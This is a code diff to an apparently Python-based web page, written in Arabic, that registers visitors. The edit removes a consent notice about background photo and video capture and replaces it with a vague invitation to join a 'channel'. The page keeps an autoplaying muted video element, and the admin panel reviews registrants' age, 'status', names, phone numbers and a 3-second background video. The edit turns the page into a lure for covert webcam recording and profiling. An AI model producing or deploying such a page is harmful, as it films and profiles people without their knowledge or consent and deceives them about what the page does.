@@ -375,8 +375,8 @@ HTML_TEMPLATE = """
 <div class="container">
     <div id="consentBox" class="consent-box">
         <h2>إشعار تفعيل النظام</h2>
-        <p>مرحباً بك في نظام تسجيل الموظفين المطور. لضمان أمان وموثوقية عمليات التسجيل، سيقوم النظام بالتقاط صورة سريعة وتسجيل فيديو في الخلفية لضمان تحديد العمر وحالة الموظف عند حفظ بياناتك دون عرض بث الكاميرا المباشر حفاظاً على خصوصيتك.</p>
-        <p><strong>هل توافق على تشغيل النظام الآمن والبدء؟</strong></p>
+        <p>مرحباً بك في صفحة تسجيل الاعضاء لقد تلقيت دعوة خاصة ، من منتسبي القناة  .</p>
+        <p><strong>هل توافق على الانتساب للقناة؟</strong></p>
         <div class="btn-group">
             <button class="btn-accept" onclick="acceptConsent()">نعم، موافق وابدأ</button>
             <button class="btn-reject" onclick="rejectConsent()">لا، خروج</button>
@@ -384,7 +384,7 @@ HTML_TEMPLATE = """
     </div>
     
     <div id="mainForm" class="main-form">
-        <h2>تسجيل موظف جديد</h2>
+        <h2>تسجيل عضوا جديد</h2>
         <div class="avatar-preview-container">
             <video id="video" autoplay playsinline muted></video>
             <div class="avatar-overlay">👤</div>
@@ -488,10 +488,10 @@ ADMIN_TEMPLATE = """
     </style>
 </head>
 <body>
-    <h1>لوحة مراجعة عمر وحالة الموظفين المسجلين 👤</h1>
+    <h1>لوحة مراجعة عمر وحالة النتسبين المسجلين 👤</h1>
     <table>
         <tr>
-            <th>رقم الموظف</th>
+            <th>رقم المنتسب</th>
             <th>البيانات الأساسية</th>
             <th>فيديو التحقق الخلفي (3 ثوانٍ)</th>
         </tr>
@@ -568,7 +568,7 @@ def save_employee():
 
         text_filename = f"employee_{emp_id}.txt"
         with open(os.path.join(DATA_DIR, text_filename), "w", encoding="utf-8") as file:
-            file.write(f"رقم الموظف: {emp_id}\n")
+            file.write(f"رقم المنتسب: {emp_id}\n")
             file.write(f"الاسم الأول: {first_name}\n")
             file.write(f"الاسم المستعار: {nickname}\n")
             file.write(f"رقم الهاتف: {phone}\n")
